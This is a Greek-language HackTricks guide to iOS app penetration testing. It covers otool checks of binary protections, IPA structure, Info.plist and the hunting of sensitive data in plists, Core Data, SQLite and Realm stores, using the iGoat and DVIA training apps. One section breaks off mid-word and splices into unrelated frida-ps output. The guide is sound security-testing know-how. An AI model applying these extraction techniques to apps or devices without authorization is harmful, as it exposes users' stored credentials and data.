# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε ροές εργασίας με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικά για το iOS

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Περιβάλλον Δοκιμής

Σε αυτήν τη σελίδα μπορείτε να βρείτε πληροφορίες σχετικά με τον **iOS simulator**, τους **εξομοιωτές** και το **jailbreaking**:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Αρχική Ανάλυση

### Βασικές Λειτουργίες Δοκιμής iOS

Κατά τη διάρκεια της δοκιμής **προτείνονται αρκετές λειτουργίες** (σύνδεση στη συσκευή, ανάγνωση/εγγραφή/αποστολή/λήψη αρχείων, χρήση ορισμένων εργαλείων...). Επομένως, αν δεν ξέρετε πώς να εκτελέσετε οποιαδήποτε από αυτές τις ενέργειες, παρακαλούμε, **αρχίστε να διαβάζετε τη σελίδα**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
Για τα επόμενα βήματα, η εφαρμογή πρέπει να είναι εγκατεστημένη στη συσκευή και πρέπει να έχετε ήδη λάβει το **αρχείο IPA** της εφαρμογής.\
Διαβάστε τη σελίδα [Βασικές Λειτουργίες Δοκιμής iOS](basic-ios-testing-operations.md) για να μάθετε πώς να το κάνετε αυτό.
{% endhint %}

### Βασική Στατική Ανάλυση

Συνιστάται η χρήση του εργαλείου [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) για να πραγματοποιήσετε αυτόματη Στατική Ανάλυση στο αρχείο IPA.

Αναγνώριση των **προστασιών που υπάρχουν στο δυαδικό αρχείο**:

*   **PIE (Position Independent Executable)**: Όταν είναι ενεργοποιημένο, η εφαρμογή φορτώνεται σε μια τυχαία διεύθυνση μνήμης κάθε φορά που ξεκινά, καθιστώντας δυσκολότερη την πρόβλεψη της αρχικής διεύθυνσης μνήμης.

```bash
otool -hv <app-binary> | grep PIE   # Θα πρέπει να περιλαμβάνει τη σημαία PIE
```
*   **Stack Canaries**: Για να επιβεβαιώσει την ακεραιότητα της στοίβας, τοποθετείται μια τιμή 'canary' στη στοίβα πριν από την κλήση μιας συνάρτησης και επαληθεύεται ξανά όταν ολοκληρώνεται η συνάρτηση.

```bash
otool -I -v <app-binary> | grep stack_chk   # Θα πρέπει να περιλαμβάνει τα σύμβολα: stack_chk_guard και stack_chk_fail
```
*   **ARC (Automatic Reference Counting)**: Για να αποτρέψει κοινά σφάλματα καταστροφής μνήμης

```bash
otool -I -v <app-binary> | grep objc_release   # Θα πρέπει να περιλαμβάνει το σύμβολο _objc_release
```
*   **Κρυπτογραφημ
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Βασική Απαρίθμηση & Hooking

Μάθετε πώς να **απαριθμήσετε τα στοιχεία της εφαρμογής** και πώς να **συνδέσετε εύκολα μεθόδους και κλάσεις** με το objection:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### Δομή του IPA

Η δομή ενός **αρχείου IPA** είναι ουσιαστικά μια **συμπιεσμένη συσκευασία**. Αλλάζοντας την επέκτασή του σε `.zip`, μπορεί να αποσυμπιεστεί για να αποκαλύψει το περιεχόμενό του. Μέσα σε αυτήν τη δομή, ένα **Bundle** αντιπροσωπεύει μια πλήρως συσκευασμένη εφαρμογή έτοιμη για εγκατάσταση. Μέσα, θα βρείτε έναν κατάλογο με το όνομα `<ΟΝΟΜΑ>.app`, ο οποίος περικλείει τους πόρους της εφαρμογής.

* **`Info.plist`**: Αυτό το αρχείο περιέχει συγκεκριμένες λεπτομέρειες ρύθμισης της εφαρμογής.
* **`_CodeSignature/`**: Αυτός ο κατάλογος περιλαμβάνει ένα αρχείο plist που περιέχει μια υπογραφή, εξασφαλίζοντας την ακεραιότητα όλων των αρχείων στο πακέτο.
* **`Assets.car`**: Ένα συμπιεσμένο αρχείο αρχειοθέτησης που αποθηκεύει αρχεία πόρων όπως εικονίδια.
* **`Frameworks/`**: Αυτός ο φάκελος περιέχει τις φυσικές βιβλιοθήκες της εφαρμογής, οι οποίες μπορεί να είναι σε μορφή αρχείων `.dylib` ή `.framework`.
* **`PlugIns/`**: Αυτό μπορεί να περιλαμβάνει επεκτάσεις της εφαρμογής, γνωστές ως αρχεία `.appex`, αν και δεν είναι πάντα παρόντα.
* [**`Core Data`**](https://developer.apple.com/documentation/coredata): Χρησιμοποιείται για την αποθήκευση μόνιμων δεδομένων της εφαρμογής για χρήση χωρίς σύνδεση, για την προσωρινή αποθήκευση δεδομένων και για την προσθήκη λειτουργικότητας αναίρεσης στην εφαρμογή σας σε μια μόνο συσκευή. Για να συγχρονίσετε δεδομένα σε πολλές συσκευές σε έναν μόνο λογαριασμό iCloud, το Core Data αντιγράφει αυτόματα το σχήμα σας σε έναν χώρο αποθήκευσης CloudKit.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): Το αρχείο `PkgInfo` είναι ένας εναλλακτικός τρόπος για να καθορίσετε τον τύπο και τους κωδικούς δημιουργού της εφαρμογής ή του πακέτου σας.
* **en.lproj, fr.proj, Base.lproj**: Είναι οι πακέτα γλωσσών που περιέχουν πόρους για αυτές τις συγκεκριμένες γλώσσες και έναν προεπιλεγμένο πόρο σε περίπτωση που μια γλώσσα δεν υποστηρίζεται.
* **Ασφάλεια**: Ο κατάλογος `_CodeSignature/` παίζει κρίσιμο ρόλο στην ασφάλεια της εφαρμογής επαληθεύοντας την ακεραιότητα όλων των συσκευασμένων αρχείων μέσω ψηφιακών υπογραφών.
* **Διαχείριση Πόρων**: Το αρχείο `Assets.car` χρησιμοποιεί συμπίεση για την αποτελεσματική διαχείριση γραφικών πόρων, το οποίο είναι κρίσιμο για τη βελτιστοποίηση της απόδοσης της εφαρμογής και τη μείωση του συνολικού μεγέθους της.
* **Βιβλιοθήκες και Πρόσθετα**: Αυτοί οι κατάλογοι υπογραμμίζουν την ευκαμψία των εφαρμογών iOS, επιτρέποντας στους προγραμματιστές να περιλαμβάνουν επαναχρησιμοποιήσιμες βιβλιοθήκες κώδικα (`Frameworks/`) και να επεκτείνουν τη λειτουργικότητα της εφαρμογής (`PlugIns/`).
* **Τοπικοποίηση**: Η δομή υποστηρίζει πολλές γλώσσες, διευκολύνοντας την παγκόσμια εμβέλεια της εφαρμογής με την περιλαμβανομένη υποστήριξη πόρων για συγκεκριμένα πακέτα γλωσσών.

**Info.plist**

Το **Info.plist** λειτουργεί ως βασικός πυλώνας για τις εφαρμογές iOS, περικλείοντας κρίσιμα δεδομένα ρύθμισης σε μορφή **ζεύγους κλειδιού-τιμής**. Αυτό το αρχείο είναι απαραίτητο όχι μόνο για τις εφαρμογές αλλά και για τις επεκτάσεις εφαρμογών και τις βιβλιοθήκες που συσκευάζονται μαζί τους. Έχει δομή είτε σε μορφή XML είτε σε δυαδική μορφή και περιέχει κρίσιμες πληροφορίες από άδειες εφαρμογών έως ρυθμίσεις ασφαλείας. Για μια λεπτομερή εξερεύνηση των διαθέσιμων κλειδιών, μπορεί κανείς να ανατρέξει στην [**Τεκμηρίωση Προγραμματιστή της Apple**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc).

Για όσους επιθυμούν να εργαστούν με αυτό το αρχείο σε μια πιο προσβάσιμη μορφή, η μετατροπή σε XML μπορεί να επιτευχθεί εύκολα μέσω της χρήσης του `plutil` στο macOS (διαθέσιμο φυσικά στις εκδόσεις 10.2 και μεταγενέστερες) ή του `plistutil` στο Linux. Οι εντολές για τη μετατροπή είναι οι εξής:

- **Για macOS**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Για Linux**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
Ανάμεσα στην αμέτρητη πληροφορία που μπορεί να αποκαλύψει το αρχείο **Info.plist**, σημαντικές καταχωρήσεις περιλαμβάνουν τις συμβολοσειρές άδειας εφαρμογής (`UsageDescription`), τις προσαρμοσμένες σχήματα URL (`CFBundleURLTypes`), και τις ρυθμίσεις για την ασφάλεια μεταφοράς της εφαρμογής (`NSAppTransportSecurity`). Αυτές οι καταχωρήσεις, μαζί με άλλες όπως οι εξαγόμενοι/εισαγόμενοι προσαρμοσμένοι τύποι εγγράφων (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), μπορούν να εντοπιστούν εύκολα επιθεωρώντας το αρχείο ή χρησιμοποιώντας μια απλή εντολή `grep`:

```bash
grep -r "UsageDescription" Info.plist
grep -r "CFBundleURLTypes" Info.plist
grep -r "NSAppTransportSecurity" Info.plist
grep -r "UTExportedTypeDeclarations" Info.plist
grep -r "UTImportedTypeDeclarations" Info.plist
```
```bash
$ grep -i <keyword> Info.plist
```
**Διαδρομές Δεδομένων**

Στο περιβάλλον του iOS, οι κατάλογοι είναι ειδικά σχεδιασμένοι για τις **εφαρμογές συστήματος** και τις **εφαρμογές που έχει εγκαταστήσει ο χρήστης**. Οι εφαρμογές συστήματος βρίσκονται στον κατάλογο `/Applications`, ενώ οι εφαρμογές που έχει εγκαταστήσει ο χρήστης τοποθετούνται κάτω από τον κατάλογο `/private/var/containers/`. Αυτές οι εφαρμογές ανατίθενται ένα μοναδικό αναγνωριστικό γνωστό ως **128-bit UUID**, καθιστώντας το καθήκον του χειροκίνητου εντοπισμού του φακέλου μιας εφαρμογής δύσκολο λόγω της τυχαιότητας των ονομάτων των καταλόγων.

Για να διευκολύνει τον εντοπισμό του φακέλου εγκατάστασης μιας εφαρμογής που έχει εγκαταστήσει ο χρήστης, το εργαλείο **objection** παρέχει ένα χρήσιμο πρόγραμμα εντολών, το `env`. Αυτή η εντολή αποκαλύπτει λεπτομερείς πληροφορίες καταλόγου για την εφαρμογή που εξετάζεται. Παρακάτω παρουσιάζεται ένα παράδειγμα πώς να χρησιμοποιήσετε αυτήν την εντολή:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Εναλλακτικά, το όνομα της εφαρμογής μπορεί να αναζητηθεί μέσα στο `/private/var/containers` χρησιμοποιώντας την εντολή `find`:
```bash
find /private/var/containers -name "Progname*"
```
Εντολές όπως `ps` και `lsof` μπορούν επίσης να χρησιμοποιηθούν για να αναγνωρίσουν τη διεργασία της εφαρμογής και να εμφανίσουν τα ανοιχτά αρχεία αντίστοιχα, παρέχοντας πληροφορίες σχετικά με τα ενεργά μονοπάτια του φακέλου της εφαρμογής.
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Κατάλογος Bundle:**

* **AppName.app**
* Αυτός είναι ο κατάλογος του Πακέτου Εφαρμογής όπως φαίνεται προηγουμένως στο IPA, περιέχει τα απαραίτητα δεδομένα της εφαρμογής, στατικό περιεχόμενο καθώς και το μεταγλωττισμένο δυαδικό της εφαρμογής.
* Αυτός ο κατάλογος είναι ορατός στους χρήστες, αλλά **οι χρήστες δεν μπορούν να γράψουν σε αυτόν**.
* Το περιεχόμενο αυτού του καταλόγου **δεν αντιγράφεται**.
* Το περιεχόμενο αυτού του φακέλου χρησιμοποιείται για τον έλεγχο της υπογραφής του κώδικα.

**Κατάλογος Δεδομένων:**

* **Documents/**
* Περιέχει όλα τα δεδομένα που δημιουργούνται από τον χρήστη. Ο τελικός χρήστης της εφαρμογής είναι αυτός που προκαλεί τη δημιουργία αυτών των δεδομένων.
* Ορατός στους χρήστες και **οι χρήστες μπορούν να γράψουν σε αυτόν**.
* Το περιεχόμενο αυτού του καταλόγου **αντιγράφεται**.
* Η εφαρμογή μπορεί να απενεργοποιήσει διαδρομές με την ρύθμιση `NSURLIsExcludedFromBackupKey`.
* **Library/**
* Περιέχει όλα τα **αρχεία που δεν είναι συγκεκριμένα για τον χρήστη**, όπως **προσωρινά αρχεία**, **προτιμήσεις**, **cookies** και αρχεία διαμόρφωσης λίστας ιδιοτήτων (plist).
* Οι εφαρμογές iOS συνήθως χρησιμοποιούν τους υποκαταλόγους `Application Support` και `Caches`, αλλά η εφαρμογή μπορεί να δημιουργήσει προσαρμοσμένους υποκαταλόγους.
* **Library/Caches/**
* Περιέχει **μερικώς μόνιμα αποθηκευμένα αρχεία**.
* Αόρατος στους χρήστες και **οι χρήστες δεν μπορούν να γράψουν σε αυτόν**.
* Το περιεχόμενο αυτού του καταλόγου **δεν αντιγράφεται**.
* Το λειτουργικό σύστημα μπορεί να διαγράψει αυτά τα αρχεία αυτόματα όταν η εφαρμογή δεν εκτελείται και ο χώρος αποθήκευσης είναι περιορισμένος.
* **Library/Application Support/**
* Περιέχει **μόνιμα αρχεία** που είναι απαραίτητα για την εκτέλεση της εφαρμογής.
* **Αόρατος** στους χρήστες και οι χρήστες δεν μπορούν να γράψουν σε αυτόν.
* Το περιεχόμενο αυτού του καταλόγου **αντιγράφεται**.
* Η εφαρμογή μπορεί να απενεργοποιήσει διαδρομές με την ρύθμιση `NSURLIsExcludedFromBackupKey`.
* **Library/Preferences/**
* Χρησιμοποιείται για την αποθήκευση ιδιοτήτων που **διατηρούνται ακόμα και μετά την επανεκκίνηση μιας εφαρμογής**.
* Οι πληροφορίες αποθηκεύονται, μη κρυπτογραφημένες, μέσα στον ασφαλή χώρο της εφαρμογής σε ένα αρχείο plist με το όνομα \[BUNDLE\_ID].plist.
* Όλα τα ζεύγη κλειδιού/τιμής που αποθηκεύονται χρησιμοποιώντας το `NSUserDefaults` μπορούν να βρεθούν σε αυτό το αρχείο.
* **tmp/**
* Χρησιμοποιήστε αυτόν τον κατάλογο για να γράψετε **προσωρινά αρχεία** που δεν χρειάζεται να διατηρούνται μεταξύ των εκκινήσεων της εφαρμογής.
* Περιέχει μη μόνιμα αποθηκευμένα αρχεία.
* **Αόρατος** στους χρήστες.
* Το περιεχόμενο αυτού του καταλόγου δεν αντιγράφεται.
* Το λειτουργικό σύστημα μπορεί να διαγράψει αυτά τα αρχεία αυτόματα όταν η εφαρμογή δεν εκτελείται και ο χώρος αποθήκευσης είναι περιορισμένος.

Ας ρίξουμε μια πιο κοντινή ματιά στον κατάλογο Πακέτου Εφαρμογής (.app) του iGoat-Swift μέσα στον κατάλογο Bundle (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Αναστροφή Δυαδικού Κώδικα

Μέσα στον φάκελο `<application-name>.app` θα βρείτε ένα δυαδικό αρχείο με το όνομα `<application-name>`. Αυτό είναι το αρχείο που θα **εκτελεστεί**. Μπορείτε να πραγματοποιήσετε μια βασική επιθεώρηση του δυαδικού κώδικα με το εργαλείο **`otool`**:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Έλεγξε αν η εφαρμογή είναι κρυπτογραφημένη**

Ελέγξτε αν υπάρχει οποιαδήποτε έξοδος για:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Αποσυναρμολόγηση του δυαδικού αρχείου**

Αποσυναρμολογήστε την ενότητα κειμένου:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Για να εκτυπωθεί το **Objective-C τμήμα** της δειγματικής εφαρμογής, μπορεί κανείς να χρησιμοποιήσει:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Για να αποκτήσετε έναν πιο συμπαγή κώδικα Objective-C, μπορείτε να χρησιμοποιήσετε το [**class-dump**](http://stevenygard.com/projects/class-dump/):
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ωστόσο, οι καλύτερες επιλογές για την αποσυναρμολόγηση του δυαδικού είναι: [**Hopper**](https://www.hopperapp.com/download.html?) και [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να αυτοματοποιήσετε ροές εργασίας με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Αποθήκευση Δεδομένων

Για να μάθετε πώς αποθηκεύει τα δεδομένα το iOS στη συσκευή, διαβάστε αυτήν τη σελίδα:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Οι παρακάτω τοποθεσίες για αποθήκευση πληροφοριών πρέπει να ελεγχθούν **αμέσως μετά την εγκατάσταση της εφαρμογής**, **μετά τον έλεγχο όλων των λειτουργιών** της εφαρμογής και ακόμη και μετά την **αποσύνδεση από έναν χρήστη και τη σύνδεση σε έναν διαφορετικό**.\
Ο στόχος είναι να βρεθούν **μη προστατευμένες ευαίσθητες πληροφορίες** της εφαρμογής (κωδικοί πρόσβασης, διακριτικά), του τρέχοντος χρήστη και των προηγουμένως συνδεδεμένων χρηστών.
{% endhint %}

### Plist

Τα αρχεία **plist** είναι δομημένα αρχεία XML που **περιέχουν ζεύγη κλειδιού-τιμής**. Είναι ένας τρόπος αποθήκευσης μόνιμων δεδομένων, οπότε μερικές φορές μπορείτε να βρείτε **ευαίσθητες πληροφορίες σε αυτά τα αρχεία**. Συνιστάται να ελέγξετε αυτά τα αρχεία μετά την εγκατάσταση της εφαρμογής και μετά την εντατική χρήση της για να δείτε αν γράφονται νέα δεδομένα.

Ο πιο συνηθισμένος τρόπος αποθήκευσης δεδομένων σε αρχεία plist είναι μέσω της χρήσης του **NSUserDefaults**. Αυτό το αρχείο plist αποθηκεύεται μέσα στο sandbox της εφαρμογής στο **`Library/Preferences/<appBundleID>.plist`**

Η κλάση [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) παρέχει μια προγραμματιστική διεπαφή για την αλληλεπίδραση με το προεπιλεγμένο σύστημα. Το προεπιλεγμένο σύστημα επιτρέπει σε μια εφαρμογή να προσαρμόσει τη συμπεριφορά της ανάλογα με τις **προτιμήσεις του χρήστη**. Τα δεδομένα που αποθηκεύονται από το `NSUserDefaults` μπορούν να προβληθούν στο πακέτο της εφαρμογής. Αυτή η κλάση αποθηκεύει **δεδομένα** σε ένα **αρχείο plist**, αλλά προορίζεται να χρησιμοποιείται με μικρές ποσότητες δεδομένων.

Αυτά τα δεδομένα δεν μπορούν πλέον να αποκτηθούν απευθείας μέσω ενός αξιόπιστου υπολογιστή, αλλά μπορούν να αποκτηθούν μέσω ενός **αντιγράφου ασφαλείας**.

Μπορείτε να **ανακτήσετε** τις πληροφορίες που αποθηκεύονται χρησιμοποιώντας το **`ios nsuserdefaults get`** του objection.

Για να βρείτε όλα τα plist που χρησιμοποιεί η εφαρμογή, μπορείτε να αποκτήσετε πρόσβαση στο `/private/var/mobile/Containers/Data/Application/{APPID}` και να εκτελέσετε:
```bash
find ./ -name "*.plist"
```
Για να μετατρέψετε αρχεία από μορφή **XML ή δυαδική (bplist)** σε XML, υπάρχουν διάφορες μέθοδοι ανάλογα με το λειτουργικό σύστημά σας:

**Για χρήστες macOS:**
Χρησιμοποιήστε την εντολή `plutil`. Είναι ένα ενσωματωμένο εργαλείο στο macOS (10.2+), σχεδιασμένο για αυτόν τον σκοπό:
```bash
$ plutil -convert xml1 Info.plist
```
**Για τους χρήστες του Linux:**
Πρώτα εγκαταστήστε το `libplist-utils` και στη συνέχεια χρησιμοποιήστε το `plistutil` για να μετατρέψετε το αρχείο σας:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Εντός μιας συνεδρίας Objection:**
Για την ανάλυση κινητών εφαρμογών, ένα συγκεκριμένο πρόγραμμα επιτρέπει τη μετατροπή αρχείων plist απευθείας:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple\_ref/doc/uid/TP40001075-CH8-SW1) είναι ένα πλαίσιο για τη διαχείριση του μοντέλου αντικειμένων στην εφαρμογή σας. [Το Core Data μπορεί να χρησιμοποιήσει το SQLite ως μόνιμη αποθήκευση των δεδομένων του](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), αλλά το ίδιο το πλαίσιο δεν είναι μια βάση δεδομένων.\
Το CoreData δεν κρυπτογραφεί τα δεδομένα του από προεπιλογή. Ωστόσο, μπορεί να προστεθεί ένα επιπλέον επίπεδο κρυπτογράφησης στο CoreData. Δείτε το [GitHub Repo](https://github.com/project-imas/encrypted-core-data) για περισσότερες λεπτομέρειες.

Μπορείτε να βρείτε τις πληροφορίες του SQLite Core Data μιας εφαρμογής στη διαδρομή `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`

**Εάν μπορείτε να ανοίξετε το SQLite και να έχετε πρόσβαση σε ευαίσθητες πληροφορίες, τότε βρήκατε μια λανθασμένη διαμόρφωση.**

{% code title="Κώδικας από το iGoat" %}
```objectivec
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
{% endcode %}

### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase) είναι ένα key/value αποθηκευτήριο που βασίζεται στο SQLite.\
Καθώς οι βάσεις δεδομένων Yap είναι βάσεις δεδομένων sqlite, μπορείτε να τις βρείτε χρησιμοποιώντας την εντολή που προτάθηκε στην προηγούμενη ενότητα.

### Άλλες βάσεις δεδομένων SQLite

Συνήθως οι εφαρμογές δημιουργούν τις δικές τους βάσεις δεδομένων SQLite. Μπορεί να αποθηκεύουν ευαίσθητα δεδομένα σε αυτές και να τα αφήνουν ανακρυπτογραφημένα. Επομένως, είναι πάντα ενδιαφέρον να ελέγχετε κάθε βάση δεδομένων μέσα στον φάκελο της εφαρμογής. Πηγαίνετε στον φάκελο της εφαρμογής όπου αποθηκεύονται τα δεδομένα (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Βάσεις δεδομένων Firebase Real-Time

Οι προγραμματιστές έχουν τη δυνατότητα να **αποθηκεύουν και συγχρονίζουν δεδομένα** σε μια **βάση δεδομένων NoSQL που φιλοξενείται στο cloud** μέσω των Firebase Real-Time Databases. Τα δεδομένα αποθηκεύονται σε μορφή JSON και συγχρονίζονται σε όλους τους συνδεδεμένους πελάτες σε πραγματικό χρόνο.

Μπορείτε να βρείτε πώς να ελέγξετε για μη σωστά διαμορφωμένες βάσεις δεδομένων Firebase εδώ:

{% content-ref url="../../network-services-pentesting/pentesting-web/buckets/firebase-database.md" %}
[firebase-database.md](../../network-services-pentesting/pentesting-web/buckets/firebase-database.md)
{% endcontent-ref %}

### Βάσεις δεδομένων Realm

Το [Realm Objective-C](https://realm.io/docs/objc/latest/) και το [Realm Swift](https://realm.io/docs/swift/latest/) προσφέρουν μια ισχυρή εναλλακτική λύση για την αποθήκευση δεδομένων, που δεν παρέχεται από την Apple. Από προεπιλογή, τα δεδομένα αποθηκεύονται μη κρυπτογραφημένα, με την κρυπτογράφηση να είναι διαθέσιμη μέσω συγκεκριμένης διαμόρφωσης.

Οι βάσεις δεδομένων βρίσκονται στη διαδρομή: `/private/var/mobile/Containers/Data/Application/{APPID}`. Για να εξερευνήσετε αυτά τα αρχεία, μπορείτε να χρησιμοποιήσετε εντολές όπως:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
Για να προβάλετε αυτά τα αρχεία βάσης δεδομένων, συνιστάται η χρήση του εργαλείου [**Realm Studio**](https://github.com/realm/realm-studio).

Για να εφαρμόσετε κρυπτογράφηση σε μια βάση δεδομένων Realm, μπορείτε να χρησιμοποιήσετε τον παρακάτω κώδικα:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Βάσεις δεδομένων του Couchbase Lite

